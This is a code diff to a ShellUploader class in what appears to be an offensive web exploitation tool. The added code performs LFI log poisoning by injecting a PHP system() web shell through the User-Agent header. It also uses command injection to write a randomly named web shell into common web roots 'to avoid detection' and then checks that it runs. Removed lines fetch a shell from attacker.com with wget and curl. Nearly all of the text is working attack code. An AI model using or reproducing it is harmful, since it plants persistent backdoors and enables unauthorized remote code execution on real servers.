@@ -150,39 +150,113 @@ class ShellUploader:
             
             if response and 'shell_works' in response.text:
                 return True
-        except:
+        except Exception:
             pass
         
         return False
     
     def _try_lfi_shell(self, finding):
         """Try to get shell via LFI/log poisoning"""
-        # This is a simplified version
-        pass
+        url = finding.url
+        param = finding.param
+        
+        # Try log poisoning: inject PHP code via User-Agent, then include the log file
+        shell_code = '<?php system($_GET["cmd"]); ?>'
+        log_paths = [
+            '../../../var/log/apache2/access.log',
+            '../../../var/log/nginx/access.log',
+            '../../../proc/self/environ',
+        ]
+        
+        try:
+            # Inject shell code via User-Agent header
+            headers = {'User-Agent': shell_code}
+            self.requester.request(url, 'GET', headers=headers)
+            
+            # Try to include the poisoned log file and execute a test command
+            for log_path in log_paths:
+                # Build request with both the LFI param and cmd param in query string
+                from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
+                parsed = urlparse(url)
+                params = parse_qs(parsed.query)
+                params[param] = [log_path]
+                params['cmd'] = ['echo lfi_shell_test']
+                new_query = urlencode(params, doseq=True)
+                test_url = urlunparse(parsed._replace(query=new_query))
+                
+                response = self.requester.request(test_url, 'GET')
+                
+                if response and 'lfi_shell_test' in response.text:
+                    print(f"{Colors.success(f'LFI shell via log poisoning: {log_path}')}")
+                    
+                    from core.engine import Finding
+                    lfi_finding = Finding(
+                        technique="Shell via LFI (Log Poisoning)",
+                        url=url,
+                        severity='CRITICAL',
+                        confidence=0.9,
+                        param=param,
+                        payload=log_path,
+                        evidence="Code execution achieved via log poisoning",
+                    )
+                    self.engine.add_finding(lfi_finding)
+                    return
+                    
+        except Exception as e:
+            if self.engine.config.get('verbose'):
+                print(f"{Colors.error(f'LFI shell error: {e}')}")
     
     def _try_rce_shell(self, finding):
         """Try to get shell via RCE"""
         url = finding.url
         param = finding.param
         
-        # Try to download and execute shell
-        shell_commands = [
-            'wget http://attacker.com/shell.php -O /var/www/html/shell.php',
-            'curl http://attacker.com/shell.php -o /var/www/html/shell.php',
-            'php -r \'file_put_contents("shell.php", file_get_contents("http://attacker.com/shell.php"));\'',
-        ]
+        # Use a randomized shell filename to avoid detection
+        import uuid
+        shell_name = f"s{uuid.uuid4().hex[:8]}.php"
         
-        for cmd in shell_commands:
-            try:
-                data = {param: f"; {cmd}"}
-                response = self.requester.request(url, 'POST', data=data)
-                
-                if response:
-                    print(f"{Colors.info(f'RCE shell command sent: {cmd[:50]}...')}")
+        # Write a shell directly on the target using echo/printf
+        shell_code = '<?php system($_GET["cmd"]); ?>'
+        web_roots = ['/var/www/html', '/var/www', '/usr/share/nginx/html', '/srv/http']
+        
+        for web_root in web_roots:
+            shell_path = f"{web_root}/{shell_name}"
+            shell_commands = [
+                f"echo '{shell_code}' > {shell_path}",
+                f"printf '{shell_code}' > {shell_path}",
+            ]
+            
+            for cmd in shell_commands:
+                try:
+                    data = {param: f"; {cmd}"}
+                    response = self.requester.request(url, 'POST', data=data)
                     
-            except Exception as e:
-                if self.engine.config.get('verbose'):
-                    print(f"{Colors.error(f'RCE shell error: {e}')}")
+                    if response:
+                        # Verify the shell was written by trying to access it
+                        from urllib.parse import urlparse
+                        parsed = urlparse(url)
+                        shell_url = f"{parsed.scheme}://{parsed.netloc}/{shell_name}?cmd=echo+rce_shell_test"
+                        verify = self.requester.request(shell_url, 'GET')
+                        
+                        if verify and 'rce_shell_test' in verify.text:
+                            print(f"{Colors.success(f'RCE shell written: {shell_url}')}")
+                            
+                            from core.engine import Finding
+                            rce_finding = Finding(
+                                technique="Shell via RCE",
+                                url=url,
+                                severity='CRITICAL',
+                                confidence=1.0,
+                                param=param,
+                                payload=cmd[:80],
+                                evidence=f"Shell written to: {shell_path}",
+                            )
+                            self.engine.add_finding(rce_finding)
+                            return
+                        
+                except Exception as e:
+                    if self.engine.config.get('verbose'):
+                        print(f"{Colors.error(f'RCE shell error: {e}')}")
     
     def generate_shell(self, shell_type: str = 'php') -> str:
         """Generate web shell code"""
